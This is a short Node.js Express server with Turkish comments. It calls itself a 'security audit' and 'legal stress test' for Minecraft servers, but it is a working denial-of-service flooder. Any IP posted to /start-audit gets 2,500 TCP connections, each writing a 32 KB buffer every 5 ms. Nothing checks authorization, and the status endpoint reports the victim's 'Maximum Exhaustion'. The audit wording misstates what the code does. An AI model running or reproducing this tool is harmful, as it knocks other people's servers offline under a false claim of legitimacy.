const net = require('net');
const express = require('express');
const mcutil = require('minecraft-server-util');
const app = express();
app.use(express.json());
app.use(require('cors')());

// Analiz Verileri
let auditData = { latency: 0, loadCapacity: "Normal", threatLevel: "Low", activeConnections: 0 };

// Sunucu Sağlık Kontrolü (Audit)
async function performAudit(host, port) {
    try {
        const start = Date.now();
        await mcutil.status(host, port);
        auditData.latency = Date.now() - start;
        
        if (auditData.latency > 1000) {
            auditData.loadCapacity = "Critical Overflow";
            auditData.threatLevel = "High";
        } else {
            auditData.loadCapacity = "Stable";
            auditData.threatLevel = "Low";
        }
    } catch (e) {
        auditData.loadCapacity = "Service Unavailable";
        auditData.threatLevel = "Maximum Exhaustion";
    }
}

// Stres Testi Üretici (Legal Stress Test)
const runStressTest = (host, port) => {
    const probe = new net.Socket();
    probe.connect(port, host, () => {
        auditData.activeConnections++;
        // Sunucunun paket işleme kapasitesini ölçmek için veri gönderimi
        const dataBuffer = Buffer.alloc(1024 * 32, "SECURITY_AUDIT");
        const stream = setInterval(() => {
            if (!probe.destroyed) {
                probe.write(dataBuffer);
            } else { clearInterval(stream); auditData.activeConnections--; }
        }, 5);
    });
    probe.on('error', () => probe.destroy());
};

app.post('/start-audit', (req, res) => {
    const { ip } = req.body;
    const host = ip.includes(':') ? ip.split(':')[0] : ip;
    const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;

    console.log(`[🛡️] Güvenlik Denetimi Başlatıldı: ${host}`);
    
    setInterval(() => performAudit(host, port), 3000);

    // Ryzen 9 gücüyle kapasite sınırlarını zorla (3500 Thread simülasyonu)
    for (let i = 0; i < 2500; i++) {
        setImmediate(() => runStressTest(host, port));
    }

    res.json({ success: true, message: "Sistem Kapasite Analizi Başlatıldı." });
});

app.get('/audit-status', (req, res) => res.json(auditData));
app.listen(process.env.PORT || 3000);
